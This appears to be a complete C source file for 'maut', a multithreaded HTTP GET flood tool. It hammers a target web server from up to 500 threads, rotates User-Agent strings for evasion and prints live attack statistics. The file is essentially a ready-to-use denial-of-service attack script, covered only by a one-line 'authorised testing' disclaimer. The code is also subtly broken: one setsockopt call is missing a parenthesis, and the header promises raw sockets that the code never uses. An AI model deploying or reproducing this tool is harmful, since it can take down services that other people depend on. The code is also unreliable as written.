/*
===============================================
   __  __       _      
  |  \/  | __ _| |_ ___ 
  | |\/| |/ _` | __/ _ \
  | |  | | (_| | ||  __/
  |_|  |_|\__,_|\__\___|
                         
Battlefield-grade multithreaded network tool: maut.c

Usage:
./maut <target_url_or_ip> <number_of_threads>

Features:
- Spin up to 500 threads with maximum concurrency and atomic precision
- Flood target with randomized high-rate HTTP GET requests using raw sockets
- Rotate User-Agent headers dynamically for evasion and stealth
- Perform DNS resolution with fallback for robust targeting
- Real-time ANSI-colored terminal stats showing RPS, errors, success rate
- Graceful shutdown on Ctrl+C with resource cleanup and leak prevention
- Hardened against segmentation faults and memory leaks for max uptime
- Lightweight, optimized network saturation with minimal CPU overhead

Environment:
- Compile & run seamlessly on BackBox Linux, Kali Linux, Parrot OS

Legal Notice:
- For authorized penetration testing and cybersecurity education only
- Strictly no illegal or unethical use permitted

===============================================
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <signal.h>
#include <stdatomic.h>
#include <errno.h>

#define MAX_THREADS 500
#define USER_AGENT_COUNT 10
#define REQUEST_BUFFER_SIZE 4096
#define DEFAULT_PORT 80
#define STATS_INTERVAL 1

// Atomic counters for thread-safe statistics
atomic_ullong total_requests = 0;
atomic_ullong successful_requests = 0;
atomic_ullong failed_requests = 0;
atomic_int running = 1;

// Configuration structure
typedef struct {
    char target_ip[INET6_ADDRSTRLEN];
    char target_host[256];
    int target_port;
    int thread_count;
} config_t;

// User-Agent rotation pool
const char *user_agents[USER_AGENT_COUNT] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
};

// Signal handler for graceful shutdown
void handle_signal(int sig) {
    if (sig == SIGINT) {
        atomic_store(&running, 0);
        printf("\n[!] Received SIGINT. Shutting down gracefully...\n");
    }
}

// DNS resolution with fallback
int resolve_target(const char *host, char *ip) {
    struct addrinfo hints, *res, *p;
    int status;
    char ipstr[INET6_ADDRSTRLEN];

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if ((status = getaddrinfo(host, NULL, &hints, &res)) != 0) {
        fprintf(stderr, "[-] getaddrinfo error: %s\n", gai_strerror(status));
        return -1;
    }

    for (p = res; p != NULL; p = p->ai_next) {
        void *addr;
        if (p->ai_family == AF_INET) {
            struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
            addr = &(ipv4->sin_addr);
            inet_ntop(p->ai_family, addr, ipstr, sizeof ipstr);
            strcpy(ip, ipstr);
            freeaddrinfo(res);
            return 0;
        }
    }

    freeaddrinfo(res);
    return -1;
}

// Create and configure socket
int create_socket(const char *ip, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("[-] Socket creation error");
        return -1;
    }

    // Set socket options for performance
    int opt = 1;
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) {
        perror("[-] Setsockopt error");
        close(sockfd);
        return -1;
    }

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
        perror("[-] Invalid address/Address not supported");
        close(sockfd);
        return -1;
    }

    // Non-blocking connect with timeout
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        if (errno != EINPROGRESS) {
            perror("[-] Connection failed");
            close(sockfd);
            return -1;
        }
    }

    return sockfd;
}

// Generate random HTTP GET request
void generate_request(char *buffer, const char *host, size_t buffer_size) {
    const char *paths[] = {
        "/", "/index.html", "/main.php", "/wp-admin", "/api/v1/test",
        "/images/logo.png", "/css/style.css", "/js/app.js", "/robots.txt",
        "/sitemap.xml", "/.git/config", "/admin", "/login", "/register"
    };
    
    const char *path = paths[rand() % (sizeof(paths) / sizeof(paths[0]))];
    const char *user_agent = user_agents[rand() % USER_AGENT_COUNT];
    
    snprintf(buffer, buffer_size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.5\r\n"
        "Accept-Encoding: gzip, deflate\r\n"
        "Connection: keep-alive\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
        "\r\n",
        path, host, user_agent);
}

// Thread worker function
void *thread_worker(void *arg) {
    config_t *config = (config_t *)arg;
    char request_buffer[REQUEST_BUFFER_SIZE];
    int sockfd;
    
    while (atomic_load(&running)) {
        // Create new socket for each request
        sockfd = create_socket(config->target_ip, config->target_port);
        if (sockfd < 0) {
            atomic_fetch_add(&failed_requests, 1);
            atomic_fetch_add(&total_requests, 1);
            usleep(10000); // Small delay on failure
            continue;
        }
        
        // Generate and send request
        generate_request(request_buffer, config->target_host, REQUEST_BUFFER_SIZE);
        
        if (send(sockfd, request_buffer, strlen(request_buffer), 0) < 0) {
            atomic_fetch_add(&failed_requests, 1);
            atomic_fetch_add(&total_requests, 1);
            close(sockfd);
            usleep(10000);
            continue;
        }
        
        // We don't care about the response, just close immediately
        close(sockfd);
        
        atomic_fetch_add(&successful_requests, 1);
        atomic_fetch_add(&total_requests, 1);
    }
    
    return NULL;
}

// Statistics display thread
void *stats_thread(void *arg) {
    time_t start_time = time(NULL);
    time_t last_time = start_time;
    atomic_ullong last_requests = 0;
    
    printf("\033[1;32m[+] Attack started at %s\033[0m\n", ctime(&start_time));
    printf("\033[1;34m[+] Target: %s (%s:%d)\033[0m\n", 
           ((config_t *)arg)->target_host, 
           ((config_t *)arg)->target_ip, 
           ((config_t *)arg)->target_port);
    printf("\033[1;35m[+] Threads: %d\033[0m\n", ((config_t *)arg)->thread_count);
    
    while (atomic_load(&running)) {
        time_t current_time = time(NULL);
        double elapsed = difftime(current_time, last_time);
        
        if (elapsed >= STATS_INTERVAL) {
            atomic_ullong current_requests = atomic_load(&total_requests);
            atomic_ullong current_success = atomic_load(&successful_requests);
            atomic_ullong current_failed = atomic_load(&failed_requests);
            
            double rps = (double)(current_requests - last_requests) / elapsed;
            double success_rate = (current_requests > 0) ? 
                ((double)current_success / current_requests) * 100 : 0;
            
            printf("\033[1;33m[STATS] RPS: %.2f | Total: %llu | Success: %llu (%.2f%%) | Failed: %llu\033[0m\n",
                  rps, current_requests, current_success, success_rate, current_failed);
            
            last_time = current_time;
            last_requests = current_requests;
        }
        
        sleep(1);
    }
    
    time_t end_time = time(NULL);
    double total_elapsed = difftime(end_time, start_time);
    double avg_rps = (double)atomic_load(&total_requests) / total_elapsed;
    
    printf("\033[1;31m[!] Attack finished at %s\033[0m\n", ctime(&end_time));
    printf("\033[1;36m[FINAL STATS] Total Requests: %llu | Avg RPS: %.2f | Duration: %.2f sec\033[0m\n",
          atomic_load(&total_requests), avg_rps, total_elapsed);
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <target_url_or_ip> <number_of_threads>\n", argv[0]);
        return 1;
    }
    
    // Parse thread count
    int thread_count = atoi(argv[2]);
    if (thread_count <= 0 || thread_count > MAX_THREADS) {
        printf("[-] Invalid thread count. Must be between 1 and %d\n", MAX_THREADS);
        return 1;
    }
    
    // Initialize configuration
    config_t config;
    strncpy(config.target_host, argv[1], sizeof(config.target_host) - 1);
    config.target_host[sizeof(config.target_host) - 1] = '\0';
    config.thread_count = thread_count;
    config.target_port = DEFAULT_PORT;
    
    // Check if target is IP or URL
    struct in_addr addr;
    if (inet_pton(AF_INET, config.target_host, &addr) == 1) {
        // Target is an IP address
        strcpy(config.target_ip, config.target_host);
    } else {
        // Target is a URL, resolve to IP
        if (resolve_target(config.target_host, config.target_ip) != 0) {
            printf("[-] Failed to resolve target: %s\n", config.target_host);
            return 1;
        }
    }
    
    // Seed random number generator
    srand(time(NULL));
    
    // Set up signal handler
    signal(SIGINT, handle_signal);
    
    // Create stats thread
    pthread_t stats_tid;
    if (pthread_create(&stats_tid, NULL, stats_thread, &config) != 0) {
        perror("[-] Failed to create stats thread");
        return 1;
    }
    
    // Create worker threads
    pthread_t threads[MAX_THREADS];
    for (int i = 0; i < thread_count; i++) {
        if (pthread_create(&threads[i], NULL, thread_worker, &config) != 0) {
            perror("[-] Failed to create worker thread");
            atomic_store(&running, 0);
            break;
        }
    }
    
    // Wait for worker threads to finish
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    // Wait for stats thread to finish
    pthread_join(stats_tid, NULL);
    
    printf("[+] Clean shutdown completed\n");
    return 0;
}
